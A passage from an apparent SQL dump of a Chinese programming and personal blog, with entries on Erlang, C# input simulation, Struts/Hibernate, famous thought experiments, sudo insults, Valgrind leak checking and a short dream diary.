Erlang进程与外部世界之间的通讯使用和在Erlang进程之间相同的消息传送机制。这种机制被用于和操作系统通讯、与其它语言编写的程序交互。如果出于高效率的需要，这种机制的一个特殊版本也允许例如C程序这样的代码直接链接到Erlang运行时系统中来。\n--Erlang的语法简洁性导致了代码可读性的下降，如果能在两者之间稍加平衡的话，可能其流行度会得到不少提升。也许是Erlang过于注重性能了，把性能作为其core business了。','',0,'newtech',0,'','zinnia/_entry_detail.html','entry_detail.html'),(338,'C#模拟鼠标和键盘','3373193720095454037164',2,'2009-06-04 17:40:37',NULL,'2009-06-04 17:40:37','2014-07-13 18:57:25','模拟鼠标和键盘<br />模拟鼠标：<br />[DllImport(\"user32\")]<br />public static extern void mouse_event(int dwFlags, int dx, int dy, int dwData, int dwExtraInfo);<br />dwFlags: 鼠标类型&nbsp; 0x2(按下左键) 0x4(松开左键) 0x8(按下右键) 0x10(松开右键)<br />dx, dy: 鼠标位置<br />dwData, dwExtraInfo; 可以都用0<br /><br />模拟键盘<br />Keyboard.SetState(Keyboard.VirtualKeys.VK_CAPITAL, !Keyboard.GetState(Keyboard.VirtualKeys.VK_CAPITAL));<br />',1,1,1,0,0,0,'模拟鼠标和键盘模拟鼠标：[DllImport(\"user32\")]public static extern void mouse_event(int dwFlags, int dx, int dy, int dwData, int dwExtraInfo);dwFlags: 鼠标类型&nbsp; 0x2(按下左键) 0x4(松开左键) 0x8(按下右键) 0x10(松开右键)dx, dy: 鼠标位置dwData, dwExtraInfo; 可以都用0模拟键盘Keyboard.SetState(Keyboard.VirtualKeys.VK_CAPITAL, !Keyboard.GetState(Keyboard.VirtualKeys.VK_CAPITAL));','',0,'develop',0,'','zinnia/_entry_detail.html','entry_detail.html'),(339,'初用Struts&amp;Hibernate的困惑','33731937200921511210205',2,'2009-03-15 23:21:00',NULL,'2009-03-15 23:21:00','2014-07-13 18:57:25','首先说Struts1.3.8,每一个框架的产生都是为了解决一些问题,但是不可避免的在解决问题的时候带来新的问题,尤其是你对这个框架越不熟悉,遇到的问题越多,最后甚至会产生\"还不如不用框架呢\"的想法.这里记录下遇到的一些问题和struts的解决之道:<br />1. 一个分类Category里有多个博客Blog, 在类中, 分类Category是博客Blog的一个属性, 而id和name是分类Category的属性. 现在在request.attribute里一个博客Blog的实例blog, 要创建一个到Category的超链接:<br />&lt;nested:root name=\"blog\"&gt;<br />&lt;nested:nested name=\"category\"&gt;<br />&lt;nested:link action=\"/category\" paramId=\"id\" paramName=\"category\" paramProperty=\"id\"/&gt;<br />&lt;/nested:nested&gt;<br />&lt;/nested:root&gt;<br /><br />2.在分类列表里,每个分类显示分类的名字,并有超链接指向分类的列表页面, 怎样进入列表?<br />使用Action,每个超链接指向Action,在Action里获得Blog列表,并request.setAttribute(),最后在列表页面用iterate显示<br /><br />然后再看Hibernae3.2<br />1.问题一:保存后并未持久化到数据库:UserDAO dao = new UserDAO(); User user = new User(); dao.save(user);<br />然后去数据库里看,并没有插入,这是为什么呢?因为connection.auto_commit属性默认是false的,也就是说它并没有提交这个操作,解决方式有两个<br />一是修改hibernate.cfg.xml,设置connection.auto_commit为true<br />另一个是在save前 Transaction t=dao.getSession().beginTransaction(), 然后在save后t.commit()<br /><br />2.问题二: 添加Blog后,Category仍然保持不变<br />Hibernate的缓存机制,使得使用BlogDAO的delete方法添加新Blog后,Category里仍然还是原来的的Blog对象集合,目前的方法是显示调用失效缓存的函数 dao.getSesion().evict(category),另一个方法是直接调用category.getBlogs().add() 这种方法理论上可行,没有试验过<br /><br />3 问题三:删除Blog后,Category仍然保持不变<br />这个问题目前还没有解决,<br /><br />最后看Struts怎样和Hibernate合作<br />双剑合璧: 使用Hibernate反向工程从表生成对象,Blog(id int, title varchar, content text, category Category), 然后直接修改这个类,让他继承ActionForm, 然后就可以直接被Struts使用了. 这是自己琢磨出来的方法,不过应该属于\"QQ可以隐身\"之流.<br />问题: 但是问题随之而来, category属性是\"类\",然后Struts就会尝试把HTML的Form传过来的categoryID赋给category属性,把一个字符串赋给一个类,肯定出错了,但我们却没有办法阻止这个赋值,因为这个赋值在预处理过程里,怎么办呢?<br />给这个Blog对象增加一个属性: int categoryId,然后给他加上@Transient,在Action里用CategoryDAO根据这个id获取Category对象并赋给form<br />',1,1,1,0,0,0,'首先说Struts1.3.8,每一个框架的产生都是为了解决一些问题,但是不可避免的在解决问题的时候带来新的问题,尤其是你对这个框架越不熟悉,遇到的问题越多,最后甚至会产生\"还不如不用框架呢\"的想法.这里记录下遇到的一些问题和struts的解决之道:1. 一个分类Category里有多个博客Blog, 在类中, 分类Category是博客Blog的一个属性, 而id和name是分类Category的属性. 现在在request.attribute里一个博客Blog的实例blog, 要创建一个到Category的超链接:&lt;nested:root name=\"blog\"&gt;&lt;nested:nested name=\"category\"&gt;&lt;nested:link action=\"/category\" paramId=\"id\" paramName=\"category\" paramProperty=\"id\"/&gt;&lt;/nested:nested&gt;&lt;/nested:root&gt;2.在分类列表里,每个分类显示分类的名字,并有超链接指向分类的列表页面, 怎样进入列表?使用Action,每个超链接指向Action,在Action里获得Blog列表,并request.setAttribute(),最后在列表页面用iterate显示然后再看Hibernae3.21.问题一:保存后并未持久化到数据库:UserDAO dao = new UserDAO(); User user = new User(); dao.save(user);然后去数据库里看,并没有插入,这是为什么呢?因为connection.auto_commit属性默认是false的,也就是说它并没有提交这个操作,解决方式有两个一是修改hibernate.cfg.xml,设置connection.auto_commit为true另一个是在save前 Transaction t=dao.getSession().beginTransaction(), 然后在save后t.commit()2.问题二: 添加Blog后,Category仍然保持不变Hibernate的缓存机制,使得使用BlogDAO的delete方法添加新Blog后,Category里仍然还是原来的的Blog对象集合,目前的方法是显示调用失效缓存的函数 dao.getSesion().evict(category),另一个方法是直接调用category.getBlogs().add() 这种方法理论上可行,没有试验过3 问题三:删除Blog后,Category仍然保持不变这个问题目前还没有解决,最后看Struts怎样和Hibernate合作双剑合璧: 使用Hibernate反向工程从表生成对象,Blog(id int, title varchar, content text, category Category), 然后直接修改这个类,让他继承ActionForm, 然后就可以直接被Struts使用了. 这是自己琢磨出来的方法,不过应该属于\"QQ可以隐身\"之流.问题: 但是问题随之而来, category属性是\"类\",然后Struts就会尝试把HTML的Form传过来的categoryID赋给category属性,把一个字符串赋给一个类,肯定出错了,但我们却没有办法阻止这个赋值,因为这个赋值在预处理过程里,怎么办呢?给这个Blog对象增加一个属性: int categoryId,然后给他加上@Transient,在Action里用CategoryDAO根据这个id获取Category对象并赋给form','',0,'\"web skills\"',0,'','zinnia/_entry_detail.html','entry_detail.html'),(340,'[zz]10个著名的思想实验','337319372010629103132608',2,'2010-07-29 10:31:32',NULL,'2010-07-29 10:31:32','2014-07-13 18:57:25','10.电车难题（The Trolley Problem） <br />“电车难题”要数伦理学领域最为知名的思想实验之一，其内容大致是：一个疯子把五个\n无辜的人绑在电车轨道上。一辆失控的电车朝他们驶来，并且片刻 \n后就要碾压到他们。幸运的是，你可以拉一个拉杆，让电车开到另一条轨道上。但是还有一个问题，那个疯子在那另一条轨道上也绑了一个人。考虑以上状况，你应\n 该拉拉杆吗？ <br /><br />解读： <br />电车难题最早是由哲学家Philippa \nFoot提出的，用来批判伦理哲学中的主要理论，特别是功利主义。功利主义提出的观点是，大部分道德决策都是根据“为最多的人提供最大的利益”的原则做出\n \n的。从一个功利主义者的观点来看，明显的选择应该是拉拉杆，拯救五个人只杀死一个人。但是功利主义的批判者认为，一旦拉了拉杆，你就成为一个不道德行为的\n \n同谋——你要为另一条轨道上单独的一个人的死负部分责任。然而，其他人认为，你身处这种状况下就要求你要有所作为，你的不作为将会是同等的不道德。总之，\n \n不存在完全的道德行为，这就是重点所在。许多哲学家都用电车难题作为例子来表示现实生活中的状况经常强迫一个人违背他自己的道德准则，并且还存在着没有完\n 全道德做法的情况。 <br /><br />9．空地上的奶牛（The Cow in the field） <br />认知论领域的一个最重要的思想实验就是\n“空地上的奶牛”。它描述的是，一个农民担心自己的获奖的奶牛走丢了。这时送奶工到了农场，他告诉农民不要 \n担心，因为他看到那头奶牛在附件的一块空地上。虽然农民很相信送奶工，但他还是亲自看了看，他看到了熟悉的黑白相间的形状并感到很满意。过了一会，送奶工\n \n到那块空地上再次确认。那头奶牛确实在那，但它躲在树林里，而且空地上还有一大张黑白相间的纸缠在树上，很明显，农民把这张纸错当成自己的奶牛了。问题是\n 出现了，虽然奶牛一直都在空地上，但农民说自己知道奶牛在空地上时是否正确？ <br /><br />解读： <br />空地上的奶牛最初是被Edmund \nGettier用来批判主流上作为知识的定义的JTB（justified true \nbelief）理论，即当人们相信一件事时，它就成为了知识；这件事在事实上是真的，并且人们有可以验证的理由相信它。在这个实验中，农民相信奶牛在空地\n \n上，且被送奶工的证词和他自己对于空地上的黑白相间物的观察所证实。而且经过送奶工后来的证实，这件事也是真实的。尽管如此，农民并没有真正的知道奶牛在\n 那儿，因为他认为奶牛在那儿的推导是建立在错误的前提上的。Gettier利用这个实验和其他一些例子，解释了将知识定义为JTB的理论需要修正。 <br /><br />8．定时炸弹（The Ticking Time Bomb） <br />如果你关注近几年的政治时事，或者看过动作电影，那么你对于“定时炸弹”思想实验肯定很熟悉。它要求你想象一个炸弹或其他大规模杀伤性武器藏在你的城市中，并且爆炸的倒计时马上就到零了。在羁押中有一个知情者，他知道炸弹的埋藏点。你是否会使用酷刑来获取情报？ <br /><br />解读： <br />与\n电车难题类似，定时炸弹情景也是强迫一个人从两个不道德行径中选择的伦理问题。它一般被用作对那些说在任何情况下都不能使用酷刑的反驳。它也被 \n用作在极端形势下法律——就像美国的严禁虐囚的法律——可以被放在第二位的例子。归功于像《24小时》的电视节目和各种政治辩论，定时炸弹情景已成为最常\n \n引用的思想实验之一。今年早些时候，一份英国报纸提出了更为极端的看法。这份报纸提议说，如果那个恐怖分子对酷刑毫无反应，那么当局者是否愿意拷打他的妻\n 子儿女来获取情报。 <br /><br />7．爱因斯坦的光线（Einstein’s Light Beam） <br />爱因斯坦著名的狭义相对论是受启于\n他16岁做的思想实验。在他的自传中，爱因斯坦回忆道他当时幻想在宇宙中追寻一道光线。他推理说，如果他能够以 \n光速在光线旁边运动，那么他应该能够看到光线成为“在空间上不断振荡但停滞不前的电磁场”。对于爱因斯坦，这个思想实验证明了对于这个虚拟的观察者，所有\n 的物理定律应该和一个相对于地球静止的观察者观察到的一样。<br />解读： <br />事实上，没人确切知道这意味着什么。科学家一直都在争论一个如此简单的思想实验是如此帮助爱因斯坦完成到狭义相对论这如此巨大的飞跃的。在当时，这个实验中的想法与现在已被抛弃的“以太”理论相违背。但他经过了好多年才证明了自己是正确的。 <br /><br />6．特修斯之船（The Ship of Theseus） <br />最\n为古老的思想实验之一。最早出自普鲁塔克的记载。它描述的是一艘可以在海上航行几百年的船，归功于不间断的维修和替换部件。只要一块木板腐烂 \n了，它就会被替换掉，以此类推，直到所有的功能部件都不是最开始的那些了。问题是，最终产生的这艘船是否还是原来的那艘特修斯之船，还是一艘完全不同的 \n船？如果不是原来的船，那么在什么时候它不再是原来的船了？哲学家Thomas \nHobbes后来对此进来了延伸，如果用特修斯之船上取下来的老部件来重新建造一艘新的船，那么两艘船中哪艘才是真正的特修斯之船？ <br /><br />解读： <br />对\n于哲学家，特修斯之船被用来研究身份的本质。特别是讨论一个物体是否仅仅等于其组成部件之和。一个更现代的例子就是一个不断发展的乐队，直到某 \n一阶段乐队成员中没有任何一个原始成员。这个问题可以应用于各个领域。对于企业，在不断并购和更换东家后仍然保持原来的名字。对于人体，人体不间断的进行\n 着新陈代谢和自我修复。这个实验的核心思想在于强迫人们去反思身份仅仅局限在实际物体和现象中这一常识。 <br /><br />5．伽利略的重力实验（Galileo’s Gravity Experiment） <br />为\n了反驳亚里士多德的自由落体速度取决于物体的质量的理论，伽利略构造了一个简单的思想实验。根据亚里士多德的说法，如果一个轻的物体和一个重的 \n物体绑在一起然后从塔上丢下来，那么重的物体下落的速度快，两个物体之间的绳子会被拉直。这时轻的物体对重物会产生一个阻力，使得下落速度变慢。但是，从\n 另一方面来看，两个物体绑在一起以后的质量应该比任意一个单独的物体都大，那么整个系统下落的速度应该最快。这个矛盾证明了亚里士多德的理论是错误的。\n <br /><br />解读： <br />这个思想实验帮助证明了一个很重要的理论：无论物体的质量，不考虑阻力的情况下，所有物体自由落体的速率都是一样的。 <br /><br />4．猴子和打字机（Monkeys and Typewriters） <br />另\n一个在流行文化中占了很大分量的思想实验是“无限猴子定理”，也叫做“猴子和打字机”实验。定理的内容是，如果无数多的猴子在无数多的打字机上 \n随机的打字，并持续无限久的时间，那么在某个时候，它们必然会打出莎士比亚的全部著作。猴子和打字机的设想在20世纪初被法国数学家Emile \nBorel推广，但其基本思想——无数多的人员和无数多的时间能产生任何/所有东西——可以追溯至亚里士多德。 <br /><br />解读： <br />简单来\n说，“猴子和打字机”定理是用来描述无限的本质的最好方法之一。人的大脑很难想象无限的空间和无限的时间，无限猴子定理可以帮助理解这些概 \n念可以达到的宽度。猴子能碰巧写出《哈姆雷特》这看上去似乎是违反直觉，但实际上在数学上是可以证明的。这个定理本身在现实生活中是不可能重现的，但这并\n \n没有阻止某些人的尝试：2003年，一家英国动物园的科学家们“试验”了无限猴子定理，他们把一台电脑和一个键盘放进灵长类园区。可惜的是，猴子们并没有\n 打出什么十四行诗。根据研究者，它们只打出了5页几乎完全是字母“s”的纸。 <br /><br />3．中文房间（The Chinese Room） <br />“中\n文房间”最早由美国哲学家John \nSearle于20世纪80年代初提出。这个实验要求你想象一位只说英语的人身处一个房间之中，这间房间除了门上有一个小窗口以外，全部都是封闭的。他随\n \n身带着一本写有中文翻译程序的书。房间里还有足够的稿纸、铅笔和橱柜。写着中文的纸片通过小窗口被送入房间中。根据Searle，房间中的人可以使用他的\n 书来翻译这些文字并用中文回复。虽然他完全不会中文，Searle认为通过这个过程，房间里的人可以让任何房间外的人以为他会说流利的中文。<br />解读： <br />Searle创造了“中文房间”思想实验来反驳电脑和其他人工智能能够真正思考的观点。房间里的人不会说中文；他不能够用中文思\n考。但因为他拥有 \n某些特定的工具，他甚至可以让以中文为母语的人以为他能流利的说中文。根据Searle，电脑就是这样工作的。它们无法真正的理解接收到的信息，但它们可\n 以运行一个程序，处理信息，然后给出一个智能的印象。 <br /><br />2．薛定锷的猫（Schrodinger’s Cat） <br />薛定锷的猫最\n早由物理学家薛定锷提出，是量子力学领域中的一个悖论。其内容是：一只猫、一些放射性元素和一瓶毒气一起被封闭在一个盒子里一个小 \n时。在一个小时内，放射性元素衰变的几率为50%。如果衰变，那么一个连接在盖革计数器上的锤子就会被触发，并打碎瓶子，释放毒气，杀死猫。因为这件事会\n 否发生的概率相等，薛定锷认为在盒子被打开前，盒子中的猫被认为是既死又活的。 <br /><br />解读： <br />简而言之，这个实验的核心思想是因为\n事件发生时不存在观察者，盒子里的猫同时存在在其所有可能的状态中（既死又活）。薛定锷最早提出这个实验是在 \n回复一篇讨论量子态叠加的文章时。薛定锷的猫同时也说明了量子力学的理论是多么令人无法理解。这个思想实验因其复杂性而臭名昭著，同时也启发了各种各样的\n 解释。其中最奇异的就属“多重世界”假说，这个假说表示有一只死猫和一只活猫，两只猫存在在不同的宇宙之中，并且永远不会有交集。 <br /><br />1． 缸中的大脑（Brain in a Vat） <br />没\n有比所谓的“缸中的大脑”假说更有影响力的思想实验了。这个思想实验涵盖了从认知学到哲学到流行文化等各个领域。这个实验的内容是：想象有一个 \n疯狂科学家把你的大脑从你的体内取出，放在某种生命维持液体中。大脑上插着电极，电极连到一台能产生图像和感官信号的电脑上。因为你获取的所有关于这个世\n \n界的信息都是通过你的大脑来处理的，这台电脑就有能力模拟你的日常体验。如果这确实可能的话，你要如何来证明你周围的世界是真实的，而不是由一台电脑产生\n 的某种模拟环境？ <br /><br />解读： <br />如果你觉得这听起来很像《黑客帝国》，那么你说对了。这部电影以及其他一些科幻作品，都是在这个思\n想实验的影响下创作出来的。这个实验的核心思想 \n是让人们质疑自身经历的本质，并思考作为一个人的真正意义是什么。这个实验的最初原型可以一直追溯至笛卡尔。在他的《Meditations on \nthe First \nPhilosophy》一书中，笛卡尔提出了能否证明他所有的感官体验都是他自己的，而不是由某个“邪恶的魔鬼”产生的这样的疑问。笛卡尔用他的经典名言\n \n“我思故我在”来回答这个问题。不幸的是，“缸中的大脑”实验更为复杂，因为连接着电极的大脑仍然可以思考。这个实验被广泛的讨论着，有许多对于此实验前\n 提的反驳，但仍没有人能有力的回应其核心问题：你究竟如何才能知道什么是真实？',1,1,1,0,0,0,'10.电车难题（The Trolley Problem） “电车难题”要数伦理学领域最为知名的思想实验之一，其内容大致是：一个疯子把五个\n无辜的人绑在电车轨道上。一辆失控的电车朝他们驶来，并且片刻 \n后就要碾压到他们。幸运的是，你可以拉一个拉杆，让电车开到另一条轨道上。但是还有一个问题，那个疯子在那另一条轨道上也绑了一个人。考虑以上状况，你应\n 该拉拉杆吗？ 解读： 电车难题最早是由哲学家Philippa \nFoot提出的，用来批判伦理哲学中的主要理论，特别是功利主义。功利主义提出的观点是，大部分道德决策都是根据“为最多的人提供最大的利益”的原则做出\n \n的。从一个功利主义者的观点来看，明显的选择应该是拉拉杆，拯救五个人只杀死一个人。但是功利主义的批判者认为，一旦拉了拉杆，你就成为一个不道德行为的\n \n同谋——你要为另一条轨道上单独的一个人的死负部分责任。然而，其他人认为，你身处这种状况下就要求你要有所作为，你的不作为将会是同等的不道德。总之，\n \n不存在完全的道德行为，这就是重点所在。许多哲学家都用电车难题作为例子来表示现实生活中的状况经常强迫一个人违背他自己的道德准则，并且还存在着没有完\n 全道德做法的情况。 9．空地上的奶牛（The Cow in the field） 认知论领域的一个最重要的思想实验就是\n“空地上的奶牛”。它描述的是，一个农民担心自己的获奖的奶牛走丢了。这时送奶工到了农场，他告诉农民不要 \n担心，因为他看到那头奶牛在附件的一块空地上。虽然农民很相信送奶工，但他还是亲自看了看，他看到了熟悉的黑白相间的形状并感到很满意。过了一会，送奶工\n \n到那块空地上再次确认。那头奶牛确实在那，但它躲在树林里，而且空地上还有一大张黑白相间的纸缠在树上，很明显，农民把这张纸错当成自己的奶牛了。问题是\n 出现了，虽然奶牛一直都在空地上，但农民说自己知道奶牛在空地上时是否正确？ 解读： 空地上的奶牛最初是被Edmund \nGettier用来批判主流上作为知识的定义的JTB（justified true \nbelief）理论，即当人们相信一件事时，它就成为了知识；这件事在事实上是真的，并且人们有可以验证的理由相信它。在这个实验中，农民相信奶牛在空地\n \n上，且被送奶工的证词和他自己对于空地上的黑白相间物的观察所证实。而且经过送奶工后来的证实，这件事也是真实的。尽管如此，农民并没有真正的知道奶牛在\n 那儿，因为他认为奶牛在那儿的推导是建立在错误的前提上的。Gettier利用这个实验和其他一些例子，解释了将知识定义为JTB的理论需要修正。 8．定时炸弹（The Ticking Time Bomb） 如果你关注近几年的政治时事，或者看过动作电影，那么你对于“定时炸弹”思想实验肯定很熟悉。它要求你想象一个炸弹或其他大规模杀伤性武器藏在你的城市中，并且爆炸的倒计时马上就到零了。在羁押中有一个知情者，他知道炸弹的埋藏点。你是否会使用酷刑来获取情报？ 解读： 与\n电车难题类似，定时炸弹情景也是强迫一个人从两个不道德行径中选择的伦理问题。它一般被用作对那些说在任何情况下都不能使用酷刑的反驳。它也被 \n用作在极端形势下法律——就像美国的严禁虐囚的法律——可以被放在第二位的例子。归功于像《24小时》的电视节目和各种政治辩论，定时炸弹情景已成为最常\n \n引用的思想实验之一。今年早些时候，一份英国报纸提出了更为极端的看法。这份报纸提议说，如果那个恐怖分子对酷刑毫无反应，那么当局者是否愿意拷打他的妻\n 子儿女来获取情报。 7．爱因斯坦的光线（Einstein’s Light Beam） 爱因斯坦著名的狭义相对论是受启于\n他16岁做的思想实验。在他的自传中，爱因斯坦回忆道他当时幻想在宇宙中追寻一道光线。他推理说，如果他能够以 \n光速在光线旁边运动，那么他应该能够看到光线成为“在空间上不断振荡但停滞不前的电磁场”。对于爱因斯坦，这个思想实验证明了对于这个虚拟的观察者，所有\n 的物理定律应该和一个相对于地球静止的观察者观察到的一样。解读： 事实上，没人确切知道这意味着什么。科学家一直都在争论一个如此简单的思想实验是如此帮助爱因斯坦完成到狭义相对论这如此巨大的飞跃的。在当时，这个实验中的想法与现在已被抛弃的“以太”理论相违背。但他经过了好多年才证明了自己是正确的。 6．特修斯之船（The Ship of Theseus） 最\n为古老的思想实验之一。最早出自普鲁塔克的记载。它描述的是一艘可以在海上航行几百年的船，归功于不间断的维修和替换部件。只要一块木板腐烂 \n了，它就会被替换掉，以此类推，直到所有的功能部件都不是最开始的那些了。问题是，最终产生的这艘船是否还是原来的那艘特修斯之船，还是一艘完全不同的 \n船？如果不是原来的船，那么在什么时候它不再是原来的船了？哲学家Thomas \nHobbes后来对此进来了延伸，如果用特修斯之船上取下来的老部件来重新建造一艘新的船，那么两艘船中哪艘才是真正的特修斯之船？ 解读： 对\n于哲学家，特修斯之船被用来研究身份的本质。特别是讨论一个物体是否仅仅等于其组成部件之和。一个更现代的例子就是一个不断发展的乐队，直到某 \n一阶段乐队成员中没有任何一个原始成员。这个问题可以应用于各个领域。对于企业，在不断并购和更换东家后仍然保持原来的名字。对于人体，人体不间断的进行\n 着新陈代谢和自我修复。这个实验的核心思想在于强迫人们去反思身份仅仅局限在实际物体和现象中这一常识。 5．伽利略的重力实验（Galileo’s Gravity Experiment） 为\n了反驳亚里士多德的自由落体速度取决于物体的质量的理论，伽利略构造了一个简单的思想实验。根据亚里士多德的说法，如果一个轻的物体和一个重的 \n物体绑在一起然后从塔上丢下来，那么重的物体下落的速度快，两个物体之间的绳子会被拉直。这时轻的物体对重物会产生一个阻力，使得下落速度变慢。但是，从\n 另一方面来看，两个物体绑在一起以后的质量应该比任意一个单独的物体都大，那么整个系统下落的速度应该最快。这个矛盾证明了亚里士多德的理论是错误的。\n 解读： 这个思想实验帮助证明了一个很重要的理论：无论物体的质量，不考虑阻力的情况下，所有物体自由落体的速率都是一样的。 4．猴子和打字机（Monkeys and Typewriters） 另\n一个在流行文化中占了很大分量的思想实验是“无限猴子定理”，也叫做“猴子和打字机”实验。定理的内容是，如果无数多的猴子在无数多的打字机上 \n随机的打字，并持续无限久的时间，那么在某个时候，它们必然会打出莎士比亚的全部著作。猴子和打字机的设想在20世纪初被法国数学家Emile \nBorel推广，但其基本思想——无数多的人员和无数多的时间能产生任何/所有东西——可以追溯至亚里士多德。 解读： 简单来\n说，“猴子和打字机”定理是用来描述无限的本质的最好方法之一。人的大脑很难想象无限的空间和无限的时间，无限猴子定理可以帮助理解这些概 \n念可以达到的宽度。猴子能碰巧写出《哈姆雷特》这看上去似乎是违反直觉，但实际上在数学上是可以证明的。这个定理本身在现实生活中是不可能重现的，但这并\n \n没有阻止某些人的尝试：2003年，一家英国动物园的科学家们“试验”了无限猴子定理，他们把一台电脑和一个键盘放进灵长类园区。可惜的是，猴子们并没有\n 打出什么十四行诗。根据研究者，它们只打出了5页几乎完全是字母“s”的纸。 3．中文房间（The Chinese Room） “中\n文房间”最早由美国哲学家John \nSearle于20世纪80年代初提出。这个实验要求你想象一位只说英语的人身处一个房间之中，这间房间除了门上有一个小窗口以外，全部都是封闭的。他随\n \n身带着一本写有中文翻译程序的书。房间里还有足够的稿纸、铅笔和橱柜。写着中文的纸片通过小窗口被送入房间中。根据Searle，房间中的人可以使用他的\n 书来翻译这些文字并用中文回复。虽然他完全不会中文，Searle认为通过这个过程，房间里的人可以让任何房间外的人以为他会说流利的中文。解读： Searle创造了“中文房间”思想实验来反驳电脑和其他人工智能能够真正思考的观点。房间里的人不会说中文；他不能够用中文思\n考。但因为他拥有 \n某些特定的工具，他甚至可以让以中文为母语的人以为他能流利的说中文。根据Searle，电脑就是这样工作的。它们无法真正的理解接收到的信息，但它们可\n 以运行一个程序，处理信息，然后给出一个智能的印象。 2．薛定锷的猫（Schrodinger’s Cat） 薛定锷的猫最\n早由物理学家薛定锷提出，是量子力学领域中的一个悖论。其内容是：一只猫、一些放射性元素和一瓶毒气一起被封闭在一个盒子里一个小 \n时。在一个小时内，放射性元素衰变的几率为50%。如果衰变，那么一个连接在盖革计数器上的锤子就会被触发，并打碎瓶子，释放毒气，杀死猫。因为这件事会\n 否发生的概率相等，薛定锷认为在盒子被打开前，盒子中的猫被认为是既死又活的。 解读： 简而言之，这个实验的核心思想是因为\n事件发生时不存在观察者，盒子里的猫同时存在在其所有可能的状态中（既死又活）。薛定锷最早提出这个实验是在 \n回复一篇讨论量子态叠加的文章时。薛定锷的猫同时也说明了量子力学的理论是多么令人无法理解。这个思想实验因其复杂性而臭名昭著，同时也启发了各种各样的\n 解释。其中最奇异的就属“多重世界”假说，这个假说表示有一只死猫和一只活猫，两只猫存在在不同的宇宙之中，并且永远不会有交集。 1． 缸中的大脑（Brain in a Vat） 没\n有比所谓的“缸中的大脑”假说更有影响力的思想实验了。这个思想实验涵盖了从认知学到哲学到流行文化等各个领域。这个实验的内容是：想象有一个 \n疯狂科学家把你的大脑从你的体内取出，放在某种生命维持液体中。大脑上插着电极，电极连到一台能产生图像和感官信号的电脑上。因为你获取的所有关于这个世\n \n界的信息都是通过你的大脑来处理的，这台电脑就有能力模拟你的日常体验。如果这确实可能的话，你要如何来证明你周围的世界是真实的，而不是由一台电脑产生\n 的某种模拟环境？ 解读： 如果你觉得这听起来很像《黑客帝国》，那么你说对了。这部电影以及其他一些科幻作品，都是在这个思\n想实验的影响下创作出来的。这个实验的核心思想 \n是让人们质疑自身经历的本质，并思考作为一个人的真正意义是什么。这个实验的最初原型可以一直追溯至笛卡尔。在他的《Meditations on \nthe First \nPhilosophy》一书中，笛卡尔提出了能否证明他所有的感官体验都是他自己的，而不是由某个“邪恶的魔鬼”产生的这样的疑问。笛卡尔用他的经典名言\n \n“我思故我在”来回答这个问题。不幸的是，“缸中的大脑”实验更为复杂，因为连接着电极的大脑仍然可以思考。这个实验被广泛的讨论着，有许多对于此实验前\n 提的反驳，但仍没有人能有力的回应其核心问题：你究竟如何才能知道什么是真实？','',0,'other',0,'','zinnia/_entry_detail.html','entry_detail.html'),(341,'Ubuntu也会骂人的','3373193720095593953218',2,'2009-06-05 21:39:53',NULL,'2009-06-05 21:39:53','2014-07-13 18:57:25','#启动insults，在Defaults的最后加上insults,用逗号分开<br />sudo visudo<br />Defaults&nbsp;&nbsp;&nbsp; env_reset,insults<br />#清空密码<br />sudo -K<br />sudo pwd<br />#试一下故意输错密码<br />[sudo] password for hankjin:<br />Have a gorilla...<br />[sudo] password for hankjin:<br />There\'s a lot of it about, you know.<br />[sudo] password for hankjin:<br />Ying Tong Iddle I Po<br />',1,1,1,0,0,0,'#启动insults，在Defaults的最后加上insults,用逗号分开sudo visudoDefaults&nbsp;&nbsp;&nbsp; env_reset,insults#清空密码sudo -Ksudo pwd#试一下故意输错密码[sudo] password for hankjin:Have a gorilla...[sudo] password for hankjin:There\'s a lot of it about, you know.[sudo] password for hankjin:Ying Tong Iddle I Po','',0,'unix',0,'','zinnia/_entry_detail.html','entry_detail.html'),(342,'在Linux下用Valgrind检查内存泄露','33731937201051093816201',2,'2010-06-10 21:38:16',NULL,'2010-06-10 21:38:16','2014-07-13 18:57:25','首先安装 sudo apt-get install valgrind<br />然后写一个内存泄露的程序<br />#include &lt;stdlib.h&gt;<br />int main()<br />{<br />&nbsp;int *p = (int*)malloc(sizeof(int));<br />&nbsp;return 0;<br />}<br />编译<br />gcc -g test.c<br />测试<br />valgrind --leak-check=full ./a.out 2&gt;&amp;1 | grep test.c<br />==21515==&nbsp;&nbsp;&nbsp; by 0x80483E0: main (test.c:4)<br />好了，去test.c的第四行看吧<br />注意：<br />1.编译的时候加-g选项，添加调试信息<br />2.运行的时候加--leak-check=full选项，否则有些内存泄露检查不出来 ！',1,1,1,0,0,0,'首先安装 sudo apt-get install valgrind然后写一个内存泄露的程序#include &lt;stdlib.h&gt;int main(){&nbsp;int *p = (int*)malloc(sizeof(int));&nbsp;return 0;}编译gcc -g test.c测试valgrind --leak-check=full ./a.out 2&gt;&amp;1 | grep test.c==21515==&nbsp;&nbsp;&nbsp; by 0x80483E0: main (test.c:4)好了，去test.c的第四行看吧注意：1.编译的时候加-g选项，添加调试信息2.运行的时候加--leak-check=full选项，否则有些内存泄露检查不出来 ！','',0,'develop',0,'','zinnia/_entry_detail.html','entry_detail.html'),(343,'梦里不知身是客、半晌贪欢','3373193720136151259985',2,'2013-07-15 13:03:05',NULL,'2013-07-15 13:03:05','2014-07-13 18:57:25','<div>习睡少而好，少梦。</div>今晨六点醒，窗外雨，困，翻身入梦。<div>故乡，小学同学们，过池塘，跳而皆落水，唯余免，继而醒，已九点。</div><div><br /></div>',1,1,1,0,0,0,'习睡少而好，少梦。今晨六点醒，窗外雨，困，翻身入梦。故乡，小学同学们，过池塘，跳而皆落水，唯余免，继而醒，已九点。','',0,'mood',0,'','zinnia/_entry_detail.html','entry_detail.html'),(344,'低效的SGMLParser','3373193720098934027784',2,'2009-09-09 15:40:27',NULL,'2009-09-09 15:40:27','2014-07-13 18:57:25','解析一个37K的html文件，循环执行1000次，竟然要用1分零8秒，而且整个过程CPU占用都是100%<br />为什么SGMLParser的效率如此低下，而CPU占用率如此之高？<br />',1,1,1,0,0,0,'解析一个37K的html文件，循环执行1000次，竟然要用1分零8秒，而且整个过程CPU占用都是100%为什么SGMLParser的效率如此低下，而CPU占用率如此之高？','',0,'develop',0,'','zinnia/_entry_detail.html','entry_detail.html'),(345,'笔试(1)-队列的使用','33731937201092481723463',2,'2010-10-24 20:34:28',NULL,'2010-10-24 20:34:28','2014-07-13 18:57:25','<b>分页</b><br />一次网页搜索的结果可能包含来自不同网站的不同网页。<br />例如，搜索Java关键字，可能搜到20条来自网站a的网页，和30条来自网站b的网页，还有40条来自其它网站的网页。<br 